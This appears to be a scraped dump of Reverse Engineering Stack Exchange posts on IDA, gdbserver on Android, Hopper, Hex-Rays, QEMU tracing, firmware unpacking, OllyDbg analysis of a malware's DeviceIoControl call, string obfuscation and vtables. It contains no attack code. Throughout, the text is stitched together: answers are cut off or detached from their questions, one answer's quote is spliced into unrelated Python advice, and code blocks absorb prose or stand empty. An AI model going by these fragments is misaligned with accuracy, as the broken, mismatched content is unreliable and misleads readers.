<p>The fact that we're missing a new() call for the Configuration variable means we can't use its parameter to get the class size. But we already know the class size is at least 7A938h, so the static variable occupies the address space from 0x190BD08 to at least 0x1986640. With a bit of luck, your .data segment has that unk_190BD08 label, with the next label being at an address a bit after 0x1986640, so the next label is some other variable, and the difference between both labels the size of the Configuration instance.</p>

<p>There's one thing left to do - when you move the configuration variable behind everything else, you'll also have to increase the size of that data segment in the PE file. Unfortunately, i'm not that skilled in the windows PE file format, so i'd have to do a lot of research how to do this correctly myself, so maybe you're lucky and someone else, who has more experience in this than i have, can help you with this.</p>

<h2>Edit - Edit to answer to comment</h2>

<ul>
<li>how can I calculate how big is the CFG_DB class in order to append something at the end of it?</li>
</ul>

<p>The original C++ program will have had something like</p>

<pre><code>int somevariable;
int someothervariable;
CFG_DB globalConfig;
int athirdvariable;
</code></pre>

<p>(int as an example, the data type could be anything)
and the compiler should place all of these varuables into the uninitialized part of the .data segment. Any access to one of the variables will make IDA create a label at that memory address, with an XREF to where it's accessed. So, if your .data dump looks like this</p>

<pre><code>.data:0190BD08 unk_190BD08     db    ?        &lt;-- along with some xrefs 
.data:0190BD09                 db    ?        &lt;-- this repeats a lot of times
.data:01986670 unk_1986670     db    ?        &lt;-- along with some xrefs 
</code></pre>

<p>and you know that 0190BD08 is your <code>globalConfig</code>, then 01986670 is <code>athirdvariable</code>, and the size of globalConfig is 0x01986670 - 0x0190BD08 = 0x7a968 = 502120 bytes.</p>

<p>This is not 100% foolproof, because if anything accesses globalConfig.somemember, with somemember having a structure offset of, say, 500000 (=0x7a120), then IDA will generate a label and an XREF at 0x190BD08+0x7a120=0x1985E28 ass well. But with a bit of luck, the ""rest"" of the program will just use the globalConfig variable as an argument to a member function, where references are indirect, so they won't be used by IDA to create labels.</p>

<ul>
<li>what will happen if other classes/methods/etc are interacting with this modified class?</li>
</ul>

<p>If they access anything but the 500 individual config entries, nothing at all, because these haven't changed their offset. The thing that might be dangerous is when they access the entries, because those accesses should be rewritten to newEntries. You have to find out where they are (if you're lucky, that's just in the member functions) and patch the code at that point. The hardware breakpoint on the (old) entries[0] address (which is 0x190BD0C in your case, structure start + 4) should help with this, because anything that's likely to access any entry, is likely to access entry[0] as well. So, if you hit the hardware breakpoint, on, say, <code>mov eax, [ebx+4]</code>, then you know <code>ebx+4</code> is accessing the old address, and should be rewritten to <code>mov eax, [ebx+XXXXX]</code> to use the new array.</p>

<p>Unfortunately, you can't create a hardware breakpoint that covers the whole structure to catch any access. That's where the null pointer exceptions kick in. If, after the change, your program throws a NPE where it normally doesn't, it's probably because 'something' accessed the old array, which contains nothing but NULLs now, instead of the new one. Catching the NPE in the debugger, and checking the disassembly/call stack that lead to it, should give you an idea where the NULL pointer was read from the old array, so you know which instruction to change to point to the new one.</p>

"Set breakpoint on shared library","2326","","<p>I am a noob to the reversing world.  I have a Android Java application which uses a shared library via JNI and I would like to set a breakpoint in the shared library.  The shared library is stripped so as I far as I understand I can set breakpoints by address only.  I have put the shared object through IDA and have a couple of positions I would like to set breakpoints but I am unsure on how I can calculate this or even if this is possible.  I am using gdbserver on Android attaching to the process and connecting from Mac OSX using gdb in the NDK.  I have been trying to calculate the memory address by taking what /proc/'pid'/smap gives me and calculating an offset from the IDA assembly I have.  Is this the right direction?  Is this even possible?</p>
","<p>I've been doing the same/similar stuff recently, and while you can get it to work, it's not that easy.</p>

<p>It helps if you have a rooted android device, a terminal emulator to run gdbserver, and, if possible, a terminal emulator that can open more than one window, so you kan kill the gdbserver from the second window if it hangs up. Also, a real keyboard on the android device helps, as it's much easier to repeat commands when you have real cursor keys.</p>

<p>You don't need to connect your Droid to your mac using an USB cable. I started gdbserver like this:</p>

<pre><code>gdbserver --attach 0.0.0.0:8765 2338
</code></pre>

<p>(where 2338 is the pid of my target application), then used</p>

<pre><code>$ arm-none-eabi-gdb
target remote 192.168.178.103:8765
</code></pre>

<p>to connect. 192.168.178.103 is the IP address of my android device.</p>

<p>I didn't want to install the complete NDK on my machine, so i downloaded the ARM GDB from <a href=""https://launchpad.net/gcc-arm-embedded/+download"" rel=""nofollow"">https://launchpad.net/gcc-arm-embedded/+download</a>, they have windows, linux and mac versions. The NDK GDB should probably work as well, of course.</p>

<p>You can add the ""IDA Address"" of the function to the Map address. For example, in my library:</p>

<ul>
<li>The two functions i was interested in had ""IDA addresses"" BA584 and BA99C.</li>
<li>The address in /proc/maps said 688D0000 as base address of the executable segment.</li>
<li>The real function addresses were 6898A584/6898A99C, which is base address + ""IDA address"" in both cases.</li>
</ul>

<p>There are two things to consider when you check you really found the correct address:</p>

<ul>
<li><p>You can't use the gdb disassemble command as it relies on functions and symbols. Use the x/i command to disassemble. For example, in my case, x/20i 0x6898A584 to see the 20 instructions at this address.</p></li>
<li><p>The arm has two different modes, Thumb mode and ARM mode. If gdb has no symbols, it might choose the wrong one when disassembling, making your GDB disassembly not resemble the IDA disassembly at all. </p></li>
</ul>

<p>Use <code>set arm force-mode arm</code> and <code>set arm force-mode thumb</code> to try both. For example, this is what IDA told me about my BA584 function:</p>

<pre><code>.text:000BA584
.text:000BA584 sub_BA584                               ; CODE XREF: sub_BF1C4+3Ap
...
.text:000BA584                 PUSH.W          {R4-R11,LR}
.text:000BA588                 MOV             R6, R0
.text:000BA58A                 SUB             SP, SP, #0x1C
.text:000BA58C                 LDR             R0, [R0,#0x18]
.text:000BA58E                 MOV             R4, R1
.text:000BA590                 STR             R2, [SP,#0x40+var_34]
</code></pre>

<p>this is what gdb made of it first:</p>

<pre><code>(gdb) x/20i 0x6890F584
 0x6890f584:  svcmi   0x00f0e92d
 0x6890f588:  addlt   r4, r7, r6, lsl #12
 0x6890f58c:  strmi   r6, [r12], -r0, lsl #19
 0x6890f590:  stmdacs r0, {r0, r1, r9, r12, pc}
 0x6890f594:  bichi   pc, r10, r0
 0x6890f598:  mlapl   r12, r6, r8, pc ; &lt;UNPREDICTABLE&gt;
 0x6890f59c:                  ; &lt;UNDEFINED&gt; instruction: 0xf0402d00
</code></pre>

<p>then</p>

<pre><code>(gdb) set arm force-mode thumb
(gdb) x/20i 0x6890F584
 0x6890f584:  stmdb   sp!, {r4, r5, r6, r7, r8, r9, r10, r11, lr}
 0x6890f588:  mov     r6, r0
 0x6890f58a:  sub     sp, #28
 0x6890f58c:  ldr     r0, [r0, #24]
 0x6890f58e:  mov     r4, r1
 0x6890f590:  str     r2, [sp, #12]
</code></pre>

<p>So don't give up if the disassembly looks weird, try forcing thumb / arm mode.</p>

<p>My application crashed various times when i was debugging it, which made gdbserver lose sync with gdb, resulting in lots of ""Ignoring packet error"" messages from gdb. Killing gdbserver (thus the 2nd window), restarting the application, and reconnecting gdb seemed to be the only remedy in these cases. When you restart the application, make sure you re-check /proc/..../maps for the .so base address, it stays the same most of the time but changes sometimes, especially when there's some time between invocations. You'll notice my address (0x6890F584) in the above example does not match the one i told you earlier, this is because in the example, the map base address had changed to 68855000.</p>

<p>There aren't really any options or built-in help. When I open <code>Hopper.app</code>'s debugger panel I only see the program running locally. I was initially thinking that the Remote Debugger was maybe used to offload some of the processing to another computer, but I've also tried running Hopper Debugger Server on another mac on my LAN but I don't see it come up in the list, only my local machine:</p>

<p>As there are no settings to specify remote connection information, I think I need to do something remotely that would specify a the address of the machine running Hopper so that it can sort of 'dial in' and then show up on the list.</p>

<p>I haven't had any luck with the Hopper website, forum, FAQ.</p>

<p>What am I missing?</p>

<p>Can anyone give me a brief outline of how the GDB/LLDB remote debugger<br>
is intended to be used (with Hopper) ?</p>
","<p>I'm surprised nobody posted an answer, but here's what I eventually came to realize:</p>

<p>A lot of times disassembling is used for taking apart potential malicious apps like viruses, worms, or malware to understand how they affect a system. There is both <a href=""https://reverseengineering.stackexchange.com/questions/3473/what-is-the-difference-between-static-disassembly-and-dynamic-disassembly"">static and dynamic disassembly</a>. Static disassembly poses (little) threat to your system as it is only looking through the code - however dynamic disassembly is actually running the code ( with breakpoints, etc ) - which is something you probably don't want to do on your main computer if the code is potentially malicious.</p>

<p>Here's what IDA says in a <a href=""https://www.hex-rays.com/products/ida/support/tutorials/unpack_pe/manual.shtml"" rel=""nofollow noreferrer"">tutorial about disassembling a ""hostile"" executable</a>:</p>

<blockquote>
  <p>We could put a breakpoint there and let the program run. Now, before we do that, let's repeat that it is not a good idea to run untrusted code on your computer. It is much better to have a separate ""sandbox"" machine for such tests, for example using the remote debugging facilities IDA offers. Therefore, IDA displays a warning when a new file is going to be started under debugger: ignore at your own risk.</p>
</blockquote>

<p>This finally made sense as an explanation for why you may want to use a remote debugger - seems so obvious now!</p>

<p>I'm still not exactly sure on how to setup and/or use Hopper's remote debugger but I'm sure I'll figure that out eventually.</p>

"Hex-Rays: JUMPOUT statements inserted due to incorrect autodetected function boundaries","2312","","<p>I'm trying to RE a Windows executable compiled with VS 2008. After the initial autoanalysis most functions are detected correctly; however, some have wrong end address — for some reason IDA places the end of the function earlier, leaving a chunk of code not associated with any function. The undetected function gets <code>noreturn</code> attribute and often has <code>sp-based autoanalysis failed</code> message. I have fixed most of these problems by hand. The problem is that Hex-Rays seems to use autodetected function boundaries and therefore the decompilation fails after a jump inside the function, which looks like a jump outside to Hex-Rays.</p>

<p>Example hex-rays output:</p>

<pre><code>void __thiscall sub_403CE0(void *this, unsigned int a2, int a3)
{
    sub_407F30(this, a2, a3);
    JUMPOUT(locret_403CFD);
}
</code></pre>

<p>As you can see, there is a <code>JUMPOUT</code> statement at the end of the function. This was correct before the function boundaries were adjusted, but now <code>locret_403CFD</code> belongs to the function itself and is not a jump “out”. Is there a way to tell hex-rays the function doesn't end here and pass a correct function start/end addresses to it?</p>
","<p>After some work with the database I figured out the reason of the strange behavior of IDA. The binary I'm trying to decompile is a GUI application that uses MFC; I have imported a number of MFC types from a PDB file obtained from Microsoft Symbol store. It's either an IDA bug or corrupted PDB — if I don't import types, all functions are detected correctly and decompilation works as expected, if I do — many function boundaries go wrong, decompilation fails, function attributes are ignored by Hex-Rays and so on.</p>

<p>One of possible workarounds is to export the database as IDC file and then run the resulting script on a clean database. This way, function prototypes and type information are kept intact. Hex-Rays decompiled results will differ, though (variable mapping information is lost, and so are local variable names). </p>

","<p>This comes down to the type of bug you are exploiting. If your payload cant contain null bytes (a vulnerable strcpy), this can become an issue, however not all bugs have this constraint. Take for example a bug in how a filetype is parsed, which allows null bytes. </p>

<p>Also there is the possibility of a series of bugs to be used, for example, the idea of heap spraying. Generally you spray the heap doing other ""legitimate"" things, such as in <a href=""https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/"">this write up</a> by corelancoder. His shell code, which would be your ROP chain, is part bitmap files that he consecutively loads to ""spray the heap"", while the bug is actually triggered by javascript and doesn't actually contain the shellcode.</p>

<p>If you want to just work on ROP, and not worry about byte limitations, i'd suggest writing a simple harness to test your shellcode.</p>

<p><strong>EDIT</strong> Sorry wrong harness. This one is clearly 64-bit specific.</p>

"Using QEmu monitor interface to extract execution traces from a binary?","2288","","<p>My original point was to build something a bit more powerful and generic than a <code>PTRACE</code> system call for Linux platforms. The problem with <code>PTRACE</code> is that it only run on your own system and architecture.</p>

<p>An idea would be to run a virtual machine (or, better, an emulator) with a different operating system and a (possibly) different architecture on it.</p>

<p>While looking for the ideal candidates, I found the <a href=""http://en.wikibooks.org/wiki/QEMU/Monitor"">QEmu monitor interface</a> and several projects using <a href=""http://wiki.qemu.org/Main_Page"">QEmu</a> as OS/architecture emulator to collect traces:</p>

<li><a href=""https://code.google.com/p/decaf-platform/wiki/DECAF"">DECAF</a> (successor of TEMU)</li>

<li><a href=""http://bitblaze.cs.berkeley.edu/temu.html"">TEMU</a> (<a href=""http://bitblaze.cs.berkeley.edu/"">Bitblaze</a>)</li>
</ul>

<p>The features I want are similar to the <code>PTRACE</code> interface (freeze execution, step by step runs, memory and registers read and write, ...) all with several OSes and several architectures. </p>

<p>My questions:</p>

<ul>
<li>Did I forgot some similar projects in my list ?</li>
<li>Can the QEmu monitor interface provide a system/architecture agnostic <code>PTRACE</code> interface just as I want ? And, if not, what are the main issues I might run into while implementing it inside QEmu ?</li>
</ul>
","<p>PANDA developer here. I think that actually most of the things you want are supported by QEMU's native gdbstub. If you start QEMU with the <code>-s -S</code> options, it will listen on port 1234 for incoming connections, and provide the functionality you want, including:</p>

<ul>
<li>Single-step using the <code>si</code> command</li>
<li>Register get/set using <code>info reg</code> and (for example) <code>set $edi = 0x40c8c39</code></li>
<li>Reading memory contents with the <code>x</code> command</li>
<li>Modify memory using <code>set *(char *) 0x1a5f2c0 = 0xd9</code></li>
<li>Breakpoints using (e.g.) <code>break *0x826e2671</code></li>
</ul>

<p>So using some gdb scripting, I think you should be able to get the capabilities you want with plain gdb and QEMU.</p>

<p>All this was just tested using a Windows 7 32-bit VM and gdb using the <code>target remote :1234</code> command.</p>

","<p>there is a slight syntax change between 1.1 and 2.01 the square are compulsory even when not dereferencing   </p>

<blockquote>
  <p>A lot of people seem to move to Mac OS X from a Linux or BSD
  background and therefore expect the ptrace() syscall to be useful.
  However, unfortunately, this isn't the case on Mac OSX. For some
  ungodly reason, Apple decided to leave ptrace() incomplete and unable
  to do much more than take a feeble attempt at an anti-debug mechanism
  or single step the process.</p>

<h2>Importing a protected module</h2>

<p>If the script is properly written, it probably wraps any execution functionality with an <code>if __name__ == ""__main__""</code> clause, protecting such cases as executing when imported. If that's the case, simply import it with an <code>import modulename</code> and then call its main/whatever.</p>

<h2>Importing a <code>sys.argv</code> module</h2>

<p>If the module directly uses <code>sys.argv</code> and you cannot/would not prevent it from doing so, you can mock your <code>sys.argv</code> before importing the module. Simply doing something like the following should work:</p>

<p><code>sys.argv = ['./script.py', 'command', 'parameter1', 'parameter2', 'optional']
import script
</code></p>

<h2>Calling <code>execfile</code> of the file</h2>

<p>If neither of those approaches works for you, you can always directly call <code>execfile</code> and completely control the context in which the python script is executed. You should read the documentation of <code>execfile</code> and <code>eval</code> <a href=""https://docs.python.org/2/library/functions.html#execfile"" rel=""nofollow"">here</a> and <a href=""https://docs.python.org/2/library/functions.html#eval"" rel=""nofollow"">here</a>, respectively.</p>

<p>How to tackle this binary? Is it even possible to get everything from it?</p>

<p>Firmware file is <a href=""ftp://ftp.manta.com.pl/firmware/Telewizory/LED3204vA/"" rel=""nofollow"">here</a> if someone what to try it.</p>
","<p>Binwalk performed a good work in this firmware file, but found too much parts. It worth to know, that Binwalk identifies types based on magic IDs and some other properties. In a typical firmware the parts are stored in compressed and may be in encrypted form. It means, there are some high entropy parts, which possible will not contain any known file type magic ID.</p>

<p>If you see the firmware file with a hex editor, you may see that it contains distinct parts (separated by a lots of 00 or FF bytes):</p>

<pre><code>0x1000-0x55000: Seems to be a bootloader started with an executable part, which was followed by a compressed part from 0x8000.
0x55000-0x3B984F: Main program
0x3B99EC: Various data parts
</code></pre>

<p>In general firmware parts starts with a header, so let's see the header of the main program:</p>

<p><a href=""https://i.stack.imgur.com/r0fgg.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/r0fgg.png"" alt=""Main program header in the firmware""></a></p>

<p>I marked the part name with blue, the size of the part with green and the LZMA header with yellow. As you can see the LZMA header contains the decompressed size (<code>0x9e2000</code> = <code>10362880</code>), but does not contain the compressed size. So, without any knowledge of the header, you can not determine the end of the compressed data, but only guess (for example from the entropy).</p>

<p>We found the main program part, but Binwalk gave a lot more results, so let's check whether other LZMA parts are valid (I changed the description in the original result).</p>

<pre><code>DECIMAL     HEX         DESCRIPTION
-------------------------------------------------------------------------------------------------------
199536      0x30B70     Valid LZMA compressed data containing part of the bootloader or OTA loader
348272      0x55070     Valid LZMA compressed data containing part of the main program

</code></pre>

<p>So, Binwalk identified correctly the first four LZMA compressed part and I think it extracted correctly also. Other parts marked with LZMA compressed data are false positives, because it is an uncompressed data area, which contains low entropy data, which sometimes similar to an LZMA header.</p>

<p>I'd like to draw your attention to the part started at <code>0xf2e64</code>. As I stated previously this area should be in the main part based on the header analysis. However, there is a separated compressed part after the first compressed image. If you check the header again, there is the offset of this second part at <code>0x55028</code>. So, it seems that the main image contains at least two separate parts.</p>

"how to reverse DeviceIoControl?","2222","","<p>I have started reversing this piece of malware. At some point it creates a service and starts it, then immediately it calls the function <code>DeviceIoControl</code> and the malware went from ""paused"" to ""running"" under ollydbg. I've searched a little bit, and I understand that this function serves to communicate with the service it just had created.</p>

<p>But how exactly do I reverse it? How do I know what it does? And how can I continue stepping under ollydbg? Or do I have to move to windbg or some other kernel-mode debugger?</p>
","<p>You cannot step into kernel mode from Ollydbg. You need a kernel debugger like <code>windbg</code>, as <code>ollydbg</code> is a user mode debugger. </p>

<p>Since you posed the question, I assume you neither have a kernel debugging connection,
nor the driver where that control code is sent for analyzing it, as answered by Jonathon.</p>

<p>Usage of proper security measures to deal with malware assumed and emphasized from here onward.</p>

<p>I assume the malware is running already as your query states that you are on <code>DeviceIoControl</code>.</p>

<p>I am going to use ollydbg 2.01.</p>

<p>Attach ollydbg to an unknown process </p>

<p>Press <kbd>Ctrl</kbd>+<kbd>G</kbd> and start typing <code>ntdll.ntDeviceIo</code> and the list box  will show 
<code>ntdll.ntDeviceIoControl</code> now  select it and <code>follow label</code>.</p>

<p>Press <kbd>F2</kbd> to set a breakpoint, and <kbd>F9</kbd> to run the attached process.</p>

<pre><code>INT3 breakpoints, item 0

  Comment = ntdll.NtDeviceIoControlFile(guessed Arg1,Arg2,Arg3,Arg4,Arg5,Arg6,Arg7,Arg8,Arg9,Arg10)

<p>Ollydbg should break when a control code is sent and stack should look like this:</p>

</code></pre>

<p>From the specs of <code>DeviceIoControlCode</code>, the first argument points to <code>handle</code> and the sixth argument is the <code>control code</code></p>

<p>Having windbg installed can make things easier from here, but we will not use windbg at this moment as it has a steep learning curve.</p>

<p>Open ollydbg handle window and find what does the handle point to (<code>0x90</code> in the above paste) - it points to a device:</p>

<pre><code>Handles, item 9
  Handle = 00000090

  Refs =    2.
  Access = 0012019F (FILE_GENERIC_READ|FILE_GENERIC_WRITE)
  Tag =

</code></pre>

<p>Now run <a href=""http://technet.microsoft.com/en-us/sysinternals/bb896653.aspx"" rel=""noreferrer"">Process Explorer</a> from <code>SysInternals</code>. Select the unknown process, and press <kbd>Ctrl</kbd>+<kbd>H</kbd> to make the lower pane show handles.</p>

"Encrypting text in binary files","2202","","<p>Text strings are usually easily read in a binary file using any editor that supports ASCII encoding of hexadecimal values. These text snippets can be easily studied and altered by a reverse engineer.</p>

<p>What options does a developer have to encrypt these text snippets, and decrypt them, in runtime ?</p>
","<p>Some options which may or may not be applicable depending on your needs:</p>

<ol>
<li><p><strong>Avoid</strong> using strings to leak out interesting information when possible. For example if you are using strings to display error information or logging information, this can give any reverse engineer valuable details as to what might be going on in your application. Instead replace these strings with numerical error codes.</p></li>
<li><p><strong>Obfuscate</strong> all strings with some kind of symmetric algorithm like a simple XOR routine, or a crypto algorithm like AES. This will prevent the string from being discovered during a casual examination of your binary. I say 'obfuscate' as you will presumably be storing the crypto/xor key in your binary. Any reverse engineer who tries a little harder will surely recover the obfuscated strings.</p></li>
<li><p><strong>Encrypt</strong> all strings (make all the strings get linked into a separate section in your executable and encrypt this section) and store the decryption key outside of your binary. You could store the key remotely and restrict access server side where possible. So if a reverse engineer does get your binary they <em>may</em> not be able to access the key. The decryption key could also be generated dynamically on the users computer based off several predictable factors known about that users machine, essentially only allowing the encrypted data to be decrypted when run on this specific machine (or type of machine). This technique has been used by government malware to encrypt payloads for specific targets (If I can remember the link to the paper I read this in I will update answer).</p></li>
<li><p><strong>Get Creative</strong>, Store all strings in a foreign language and then at run time use an online translation service to translate the string back to your expected native language. This is of course not very practical.</p></li>
</ol>

<p>Of course if your strings do get decoded/decrypted at run time then a reverse engineer could just dump the process from memory in order to see the strings. For this reason it may be best to decode/decrypt individual strings only when needed (possibly storing the decoded string in a temporary location and zeroing it after use).</p>

<blockquote>
  <p>ObjectStubless simply calls into ObjectStublessClient, passing the method index (from ecx) as a parameter. Finally, ObjectStublessClient teases out the format strings from the vtable and jumps to NdrClientCall2. Like NdrStubCall2, this RPCRT4.DLL routine performs the interpretive marshaling and unmarshaling just as if a compiled proxy and stub were in use. </p>

- _NewEnum()
- Register()
- RegisterPending()
- Revoke()
- OnNavigate()
- OnActivated()
- FindWindowSW()
- OnCreated()

<p>However, you can also see in the IDL that the <code>IShellWindows</code> interface inherits from <code>IDispatch</code>. <code>IDispatch</code> has the following vtable entries (from <code>OAIdl.idl</code>):</p>

<pre><code>- GetTypeInfoCount()
- GetTypeInfo()
- GetIDsOfNames()
- Invoke()

<p>The IDL for <code>IDispatch</code> in <code>OAIdl.idl</code> also specifies that <code>IDispatch</code> inherits from <code>IUnknown</code>. <code>IUnknown</code> has the following vtable entries (from <code>Unknwn.idl</code>):</p>

- AddRef()
- Release()

<p>So now we know that <code>IShellWindows</code> inherits from <code>IDispatch</code>, which inherits from <code>IUnknown</code>. As such, the full layout of the vtable for <code>IShellWindows</code> is as follows:</p>

*ppv+08h = Release()
*ppv+0Ch = GetTypeInfoCount()

*ppv+18h = Invoke()
*ppv+1Ch = Count()
*ppv+20h = Item()
*ppv+24h = _NewEnum()
*ppv+28h = Register()
...
</code></pre>

<p>Looking back at your code, we see a call to <code>*ppv+1Ch</code>, which we see from our constructed vtable above is a call to the function <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/cc836569%28v=vs.85%29.aspx"" rel=""noreferrer""><code>IShellWindows::Count()</code></a>, and <code>&amp;var_C</code> is the pointer to <code>IShellWindows::Count()</code>'s <code>[out, retval]  long *Count</code> parameter.</p>

<p>Every java bytecode disassembler I have found (I have spent much time on google, and downloaded several different ones to try) produces output which is essentially the same as this. Some format or decorate it slightly differently; some replace the command line interface with a fancy GUI; but not one of them displays the addresses of the instructions in the .class file, nor the bytecodes themselves - there are several which <em>claim</em> to show the bytecodes, but none of them actually do, they display only the textual mnemonics representing the bytecodes rather than the bytecodes themselves. Also, they all display the numerical information in decimal, not in hex.</p>

<p>Here is an edited version of the above output which I have transformed by hand to produce an example of the sort of thing I am looking for:</p>

[branch to decrypt until reg3 completes]
</code></pre>

<p>then we can analyse the opcodes that can produce the register assignments, and we know the set of garbage instructions, the decryption methods, the register adjustment, etc.</p>

<p>From there, we can use a state machine to watch for the real instructions, and ignore the fake ones.  The implementation details of that are long and boring, and not suitable as an answer here.
It's a one-engine one-algorithm relationship, in most cases.</p>

<p>As a result, the emulator became the most useful tool that we have against that attack, allowing us to essentially ""let the virus decrypt itself"" and then we can see what's underneath (the attack against that is obviously metamorphism, and the simplest implementation is at the source level rather than post-compilation).</p>

<p>So, in short, the answer is generally ""we don't anymore"".  That is, we tend to no longer detect the polymorphic engine itself.  There are of course exceptions to that, but they are few and far between these days.</p>

"Where the pointer to virtual function table is located?","2179","","<p>I used to think that the pointer to the Virtual Function Table (VFT, also Virtual Method Table, VMT) is the very first 32-bit word of the object binary representation.</p>

<p>But now I see a VFT whose index is 13 (!!!!), that is, offset=0x34. (I write ""index"" because the code to invoke the Qt function <code>o.metaObject()</code> is <code>((func***)o)[13][0](o)</code>). OMG, what is going on? Why the VFT address is located... where?</p>

<p>EDIT (after complaints that the question is unclear):</p>

<p>Each object with virtual functions has a pointer to the Virtual Function Table. Usually, this is the very first 32-bit value in the object's binary representation (and may be accessed as <code>((void**)objAddr)[0]</code>). But in the example below the offset of VMT pointer is not 0! (Function names may be demangled by <a href=""http://linux.die.net/man/1/c++filt"" rel=""nofollow""><code>c++filt</code></a>; for readability, the class names have been shortened to <code>Abc</code> and <code>Xyz</code>):</p>

<p><em>I want to be able to locate the pointer to VMT for any object,</em> but as the example above shows, the pointer to VMT is not necessarily <code>((void**)objAddr)[0]</code>.</p>

<p>So the question is:</p>

<p>1) <strong><em>why the VMT pointer is in the middle of the object's binary representation?</em></strong> There must be something specific about this place.</p>

<p>2) <strong><em>how do I find out where the VMT pointer actually is?</em></strong> (Ideally, at run-time given the object address. I have the code to tell a valid address from an invalid one. I'm interested in GCC for Android/ARM, although techniques for different platforms may turn out to be applicable.)</p>

<p>PS the code to detect a valid address on Android is:</p>

<pre><code>#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
int isValidPtr(const void*p, int len) {
    if (!p) { return 0; }
    int ret = 1;
    int nullfd = open(""/dev/random"", O_WRONLY); // does not work with /dev/null !!!
    if (write(nullfd, p, len) &lt; 0) {
        ret = 0; /* Not OK */
    }
    close(nullfd);
    return ret;
}
</code></pre>

<p>UPDATE</p>

<p>In the following example, the VMT offset is 0:</p>

<pre><code>class Base {
public:
  int x,y;
};
class Derived: public Base {
public:
  int z;
  Derived();
  virtual int func();
  virtual int func2();
};
</code></pre>

<p>Coercion from <code>Base*</code> to <code>Derived*</code> compiles to: <code>SUBS R0, #4</code></p>

<pre><code>int test3(Base*b) {
    Derived*d = (Derived*)b;
    int r = addDerived(*d);
    return r;
}

<p>I tried</p>

<pre><code>struct Cls2 {
    unsigned x[13];
    Derived d;
    Cls2();
};
</code></pre>

<p>and here's the disassembly:</p>

<pre><code>.text:00001CE2 _ZN4Cls2C2Ev ; Cls2::Cls2(void)

.text:00001CF0                 POP             {R4,PC}
</code></pre>

<p>That is, the VFT pointer of <code>Cls2::d</code> will indeed be at offset 0x34, but there's no <code>STR.W R3,[R6],#0x34</code>, so it is not #2 suggested by Willem Hengeveld.</p>

You may use the Ida feature Menu Search, Sequence of Bytes...</p>

The conversion can be done in Ida as well (IIRC), or in any other hex editor allowing to display different data types. Of course, if your variable is a double instead of a float you need the proper byte sequence for a double which is different. 
When searching for a string, you may use the same method. Of course here also you must know e.g. whether you are looking for an ascii string or another kind of string like unicode.
With that method, the endian-ness must be observed, because the byte sequence may be different with Big-Endian or Little-Endian.</p>

<p>Question 2:</p>

<p>In case you found your memory address, put a breakpoint on it. In a memory region, a window opens where you may edit your breakpoint, e.g. select break or trace, as well as the condition when to break and other items.

"What is MSR Tracing?","2113","","<p>I was reading a <a href=""http://www.openrce.org/blog/view/1061/Industrial-Grade_Binary-Only_Profiling_and_Coverage"">old blog post on OpenRCE</a> that mentions MSR tracing in the context of binary only profiling and coverage. The only Google hits for this term are a few emails on the Xen mailing list that I am not able to understand. What is MSR tracing?</p>
","<p>MSR tracing generally refers to using the Intel Model-Specific Registers (MSRs) to obtain trace information from the CPU. Because modern (post-Pentium 4, generally) processors have hardware support for debugging, this can be faster than software-only solutions. There are a few ways this can be done:</p>

<ul>
<li><p>As described in a <a href=""http://pedramamini.com/blog/2006-12-13/"" rel=""nofollow noreferrer"">post by Pedram Amini</a>, one can speed up single-step execution by setting the <code>MSR_DEBUGCTLA</code> MSR and enabling the <code>BTF (single-step on branches)</code> flag. This gives better performance than pure single-stepping, which raises a debug exception on every instruction.</p></li>
<li><p>One can use the ""<code>Branch Trace Store (BTS)</code>"" facility to log all branches into a buffer in memory; furthermore, the processor can be configured to raise an interrupt whenever this buffer is filled, so you can flush it to disk (or whatever you like). On some models there are also options for tracing only user-mode (CPL > 0) or only kernel-mode (CPL = 0) code. Sections 17.4.5-6 and 17.4.9 of the Intel Software Developer's Manual Volume 3B are required reading if you go this route.</p>

<p>In Linux, there is some kernel support for this, though as far as I can tell none of it has made it into the stock kernel. In 2011 there was a <a href=""http://lwn.net/Articles/444885/"" rel=""nofollow noreferrer"">proposed patch by Akihiro Nagai</a> to the <code>perf</code> tool to add a <code>perf branch trace</code> command which would use the Intel BTS system; a <a href=""http://events.linuxfoundation.org/slides/2011/linuxcon-japan/lcj2011_nagai.pdf"" rel=""nofollow noreferrer"">presentation</a> on this is also available. Also, in 2007, there was a <a href=""http://lwn.net/Articles/259339/"" rel=""nofollow noreferrer"">patch proposed</a> to <code>ptrace</code> to expose the BTS facility.</p>

<p>I don't know of anything off-the-shelf that can do this in Windows.</p></li>
<li><p>Finally, If you only care about a fairly small (4-16) number of branches, you can use the <code>Last Branch Recording (LBR)</code> feature. This has the advantage of having basically no overhead, but the fairly major downside that it will only give you the last N branches, where N varies depending on the processor (from as few as 4 to as many as 16). Details on this can be found in Section 17.4.8 of the Intel developer's manual.</p>

<p>One interesting note is that Haswell (Intel's just-released processor architecture) <a href=""http://lwn.net/Articles/535152/"" rel=""nofollow noreferrer"">has a version of this</a> that will keep track of calls and returns, effectively giving you a small shadow call stack, which can be quite useful in some scenarios.</p>

<p>LBR has also been used in <a href=""http://research.microsoft.com/pubs/153179/sim-ccs09.pdf"" rel=""nofollow noreferrer"">at least one</a> security system to verify that a function is only being called from a trusted source, but this is getting a bit off-topic for the question.</p></li>
</ul>

<p>So, to sum up, MSR tracing is a way of doing tracing faster using hardware support in Intel processors. It's very appealing theoretically, but there isn't (yet) a lot of support for it in commonly available tools.</p>

Here is the file: <a href=""https://tuts4you.com/download.php?view.141"" rel=""nofollow"">https://tuts4you.com/download.php?view.141</a></p>
","<p>IDA doesn't do the kind of memory breakpoints that Olly implements.  Olly implements memory breakpoints by changing the page protection, catching the exception, and then examining some extra data to see if it's one of its own memory ""breakpoints"". IDA only allows you to do regular software breakpoints (CC), and hardware breakpoints(DR0-DR3).</p>

<p>That being said, if you'd like to break on a memory access using IDA's debugger, you'll have to use a regular hardware breakpoint.  You simply click the DWORD in memory you'd like to break on, and then click Debugger -> Breakpoints -> Add Breakpoint.  IDA will automatically populate the address of the DWORD in the ""Location"" field, and then you can set whatever other options you wish.</p>

<p>If you want to set a breakpoint on an entire section similar to what you'd do from the Memory Map view in Olly, do the following:</p>

<ol>
<li>In debugger mode, click View -> open Subviews -> Program Segmentation. </li>
<li>Right-click on "".text"" or whatever other segment you need. </li>
<li>Click ""Break on Access"" </li>
</ol>

